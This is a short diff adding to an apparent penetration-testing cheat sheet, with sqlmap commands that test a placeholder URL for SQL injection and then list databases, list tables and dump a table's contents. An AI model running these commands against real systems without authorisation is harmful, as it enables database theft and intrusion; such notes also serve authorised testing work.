@@ -43,4 +43,13 @@ exploitdb https://github.com/offensive-security/exploitdb
     gcc gcc XXX.c -o test
     ./test
 
+sqlmap 
+
+    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL #GET
+    sqlmap -u "http://XXX.com/db.php" --method POST --data "id=XXX" #POST
+
+    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL --dbs 
+    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL -D [db_name] --tables 
+    sqlmap -u "http://XXX.com/db.php?id=XXX" --dbms=MySQL -D [db_name] --T [tb_name] --dump
+
 
